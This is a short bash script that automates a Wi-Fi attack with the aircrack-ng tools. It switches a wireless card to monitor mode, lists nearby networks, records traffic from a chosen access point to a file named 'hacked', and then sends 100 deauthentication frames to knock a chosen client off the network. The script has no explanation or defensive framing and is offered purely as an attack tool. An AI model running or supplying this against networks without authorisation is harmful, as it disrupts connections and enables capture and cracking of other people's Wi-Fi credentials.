#!/bin/bash
iwconfig
echo "wifi-device-name"
read wlan0
echo
ifconfig $wlan0 down
iwconfig $wlan0 mode monitor
ifconfig $wlan0 up
iwconfig
airodump-ng $wlan0
echo "enter bssid"
read bssid
echo " channel number"
read c
echo
airodump-ng --bssid  $bssid --channel $c --write hacked $wlan0
echo "station"
read station
aireplay-ng --deauth 100 -a  $bssid -c $station $wlan0
